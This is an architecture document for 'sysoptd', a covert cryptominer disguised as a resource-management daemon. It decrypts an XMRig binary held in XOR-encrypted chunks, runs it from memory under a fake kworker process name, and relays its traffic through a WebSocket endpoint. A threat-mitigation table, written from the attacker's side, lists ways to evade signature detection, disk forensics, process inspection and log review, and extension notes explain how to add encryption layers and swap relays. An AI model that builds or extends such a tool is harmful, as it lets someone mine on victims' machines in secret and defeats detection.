# Architecture Overview

## System Design

`sysoptd` is a distributed resource management system that executes encrypted binary payloads in memory without leaving disk artifacts.

```
┌──────────────────────────────────────────────────────────────┐
│                        Worker Node                           │
│                                                               │
│  ┌─────────────┐         ┌──────────────┐                   │
│  │  sysoptd.py │────────>│  lib/loader  │                   │
│  └─────────────┘         └──────────────┘                   │
│        │                        │                             │
│        │                        ▼                             │
│        │              ┌──────────────────┐                   │
│        │              │ Encrypted Chunks │                   │
│        │              │  data/*.dat      │                   │
│        │              └──────────────────┘                   │
│        │                        │                             │
│        │                        │ Double XOR Decrypt          │
│        │                        ▼                             │
│        │              ┌──────────────────┐                   │
│        │              │ In-Memory Binary │                   │
│        │              │  (memfd_create)  │                   │
│        │              └──────────────────┘                   │
│        │                        │                             │
│        │                        │ Execute                     │
│        ▼                        ▼                             │
│  ┌────────────────────────────────────┐                     │
│  │      Worker Process (XMRig)        │                     │
│  │    /dev/shm/.kworker_xxxxx         │                     │
│  └────────────────────────────────────┘                     │
│        │                                                      │
│        │ stdout/stderr                                       │
│        ▼                                                      │
│  ┌──────────────┐                                           │
│  │ Log Handler  │                                           │
│  │ (filters)    │                                           │
│  └──────────────┘                                           │
│        │                                                      │
│        ▼                                                      │
│  ┌─────────────────┐          ┌──────────────────┐         │
│  │ runtime/        │          │  lib/net_relay   │         │
│  │ session.log     │          │  (TCP→WebSocket) │         │
│  └─────────────────┘          └──────────────────┘         │
│                                        │                     │
└────────────────────────────────────────┼─────────────────────┘
                                         │
                                         │ WebSocket (TLS)
                                         ▼
                              ┌──────────────────────┐
                              │   Relay Server       │
                              │ relay.sysopt.        │
                              │ workers.dev          │
                              └──────────────────────┘
```

---

## Component Details

### 1. Main Daemon (`sysoptd.py`)

**Responsibilities:**
- Parse command-line arguments
- Initialize worker configuration
- Spawn worker processes
- Manage background services (noise, relay)
- Handle process lifecycle

**Key Functions:**
- `main()` - Entry point, orchestrates startup
- `run_worker()` - Loads and executes binary
- `start_noise_worker()` - Spawns decoy processes
- `start_shim()` - Starts network relay

**Process Management:**
- Can spawn multiple worker processes (`--no-split` disables)
- Each process gets unique label (e.g., `kworker_0:1H`)
- Monitors child processes and restarts on failure

---

### 2. Binary Loader (`lib/loader.py`)

**Responsibilities:**
- Load encrypted chunks from `data/` directory
- Decrypt using double-XOR algorithm
- Assemble complete binary in memory
- Create executable file descriptor via `memfd_create`

**Key Functions:**
```python
load_segments(segment_dir: str) -> bytes
    # Loads all .dat files, decrypts, concatenates

_decrypt(data: bytes) -> bytes
    # Double XOR: ciphertext → XOR(KEY) → XOR(KEY2) → plaintext

assemble_to_memfd(segment_dir: str, label: str) -> int
    # Returns file descriptor for in-memory executable
```

**Encryption Details:**
- **Algorithm:** Double-XOR with fixed keys
- **Key 1 (_KEY):** `\x7f\x45\x4c\x46\x02\x01\x01\x00` (mimics ELF header)
- **Key 2 (_KEY2):** `\xde\xad\xbe\xef\xca\xfe\xba\xbe` (0xdeadbeef pattern)
- **Order:** Encrypt: KEY2 → KEY, Decrypt: KEY → KEY2

**Chunk Format:**
- Sequential filenames: `0000.dat`, `0001.dat`, ..., `0049.dat`
- Fixed size: ~200KB per chunk
- Total: 50 chunks, ~10MB binary

---

### 3. Network Relay (`lib/net_relay.py`)

**Responsibilities:**
- Bridge local TCP connections to remote WebSocket
- Handle auto-reconnection on failures
- Forward bidirectional traffic

**Architecture:**
```
Worker Process → localhost:PORT → net_relay → wss://relay.sysopt.workers.dev
```

**Key Features:**
- Async I/O using `asyncio`
- WebSocket with TLS (`wss://`)
- Automatic reconnection with exponential backoff
- Handles both text and binary frames

---

### 4. Log Handler (`lib/log_handler.py`)

**Responsibilities:**
- Filter sensitive information from worker output
- Transform output to look like system logs
- Suppress noise and verbose messages

**Filtering Rules:**
- Replace mining-specific terms
- Suppress connection errors
- Reformat timestamps
- Hide pool addresses

---

### 5. Fingerprinting (`lib/fingerprint.py`)

**Responsibilities:**
- Generate unique hash per deployment
- Modify file metadata to create unique signature
- Prevent signature-based detection

**Usage:**
```bash
python3 lib/fingerprint.py <directory>
```

**How it Works:**
1. Generates random salt
2. Creates unique hash: `sha256(salt + current_time)`
3. Stores salt in deployment
4. Each deployment has unique file hashes

---

## Data Flow

### Startup Sequence

1. **Parse Arguments**
   ```
   sysoptd.py --rig worker-01 --threads 4
   ```

2. **Load Configuration**
   - Determine worker count (procs)
   - Calculate memory allocation
   - Select execution strategy (split/monolith)

3. **Start Background Services**
   - Noise workers (decoy processes)
   - Network relay (TCP→WebSocket bridge)

4. **Load Binary**
   ```python
   # lib/loader.py
   chunks = sorted(glob('data/*.dat'))
   plaintext = []
   for chunk in chunks:
       encrypted = read(chunk)
       decrypted = XOR(XOR(encrypted, KEY), KEY2)
       plaintext.append(decrypted)
   binary = concat(plaintext)
   ```

5. **Execute Worker**
   - Write binary to `/dev/shm/.kworker_xxxxx`
   - Set executable permissions (0755)
   - Spawn via `subprocess.Popen()`
   - Schedule cleanup after 10 seconds

6. **Monitor & Log**
   - Capture stdout/stderr
   - Filter through log handler
   - Write to `runtime/session.log`

---

## Security Model

### Threat Mitigation

| Threat | Mitigation |
|--------|------------|
| Static analysis of chunks | Double-XOR encryption, no plaintext strings |
| Signature-based detection | Unique fingerprint per deployment |
| Disk forensics | Binary stored in `/dev/shm` (tmpfs), auto-deleted |
| Process inspection | Process name mimics kernel worker (`kworker_0:1H`) |
| Network monitoring | TLS WebSocket to generic domain |
| Git history leaks | Cleaned history (14→3 commits) |
| Bytecode leaks | All `__pycache__` deleted |

### Defense Layers

1. **At Rest:** Encrypted chunks (double-XOR)
2. **In Transit:** TLS WebSocket connection
3. **In Memory:** Executed via `memfd_create` (no disk write)
4. **Process:** Mimics system process names
5. **Network:** Generic relay domain (`relay.sysopt.workers.dev`)
6. **Deployment:** Unique fingerprint per instance

---

## Performance Characteristics

### Resource Usage

| Threads | CPU Usage | RAM Usage | Hash Rate |
|---------|-----------|-----------|-----------|
| 1       | ~50%      | ~2.5GB    | Baseline  |
| 2       | ~100%     | ~3.5GB    | ~2x       |
| 4       | ~200%     | ~4.5GB    | ~4x       |
| 8       | ~400%     | ~6.5GB    | ~8x       |

### Startup Time

- **Chunk loading:** ~1-2 seconds
- **Decryption:** ~0.5 seconds
- **Binary assembly:** ~0.5 seconds
- **Worker spawn:** ~2-3 seconds
- **First hash:** ~5-10 seconds

**Total startup:** ~10-15 seconds

---

## Deployment Topology

### Single-Node Deployment

```
┌─────────────────┐
│   Worker Node   │
│   sysoptd.py    │──────> Relay Server
└─────────────────┘
```

### Multi-Node Deployment

```
┌─────────────────┐
│   Worker 1      │──┐
└─────────────────┘  │
                     │
┌─────────────────┐  │    ┌──────────────┐
│   Worker 2      │──┼───>│ Relay Server │
└─────────────────┘  │    └──────────────┘
                     │
┌─────────────────┐  │
│   Worker N      │──┘
└─────────────────┘
```

---

## Configuration

### Environment Variables

None required - all configuration via CLI arguments

### File Locations

```
sysoptd-v2/
├── data/                  # Encrypted binary chunks
│   ├── 0000.dat
│   ├── 0001.dat
│   └── ...
├── lib/                   # Core libraries
│   ├── loader.py          # Binary loader
│   ├── net_relay.py       # Network bridge
│   ├── log_handler.py     # Log filtering
│   └── fingerprint.py     # Deployment fingerprinting
├── runtime/               # Runtime data
│   └── session.log        # Worker output
└── sysoptd.py            # Main daemon
```

### Execution Locations

- **Temp binary:** `/dev/shm/.kworker_xxxxx` (tmpfs, RAM-backed)
- **Logs:** `runtime/session.log`
- **PID files:** None (process management via `ps`)

---

## Extensibility

### Adding New Encryption

Modify `lib/loader.py`:

```python
_KEY3 = b'...'

def _decrypt(data: bytes) -> bytes:
    stage1 = XOR(data, _KEY)
    stage2 = XOR(stage1, _KEY2)
    stage3 = XOR(stage2, _KEY3)  # Add third layer
    return stage3
```

### Custom Relay Endpoint

```bash
python3 sysoptd.py --rig worker-01 --bridge wss://custom.relay.com
```

### Custom Binary

Replace chunks in `data/` directory using re-chunk script (see `docs/README.md`)

